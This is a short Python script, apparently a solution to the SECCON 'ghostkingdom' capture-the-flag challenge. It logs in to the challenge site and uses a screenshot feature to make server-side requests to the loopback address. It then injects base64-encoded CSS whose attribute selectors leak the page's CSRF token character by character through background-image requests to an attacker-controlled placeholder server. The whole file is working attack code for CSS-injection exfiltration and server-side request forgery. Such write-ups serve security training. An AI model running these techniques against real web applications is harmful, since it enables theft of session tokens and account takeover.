import string, base64
import requests, time

def css_gen(known):
	css = ''
	for s in string.ascii_lowercase + string.digits:
		css += 'input[name=\"csrf\"][value^=\"'+ known + s +'\"]{background:url(http:// SERVER /'+ known + s +');}'
	return base64.b64encode(css)
	
base_url = 'http://ghostkingdom.pwn.seccon.jp/?url=http%3A%2F%2F2130706433%2F%3Fmsg%3Dasd%26action%3Dmsgadm2%26css%3D'
known = ''
p = requests.session()
p.get('http://ghostkingdom.pwn.seccon.jp/?user={ LOGIN ID }&pass={ LOGIN PASS }&action=login')
print p.get('http://ghostkingdom.pwn.seccon.jp/?url=http%3A%2F%2F2130706433%2F%3Fuser%3D{ LOGIN ID }%26pass%3D{ LOGIN PASS }%26action%3Dlogin&action=sshot2').text
while True:
	print '[+] Wait 25 secs'
	time.sleep(25)
	print  p.get(base_url + css_gen(known) + '&action=sshot2').text
	known += raw_input()
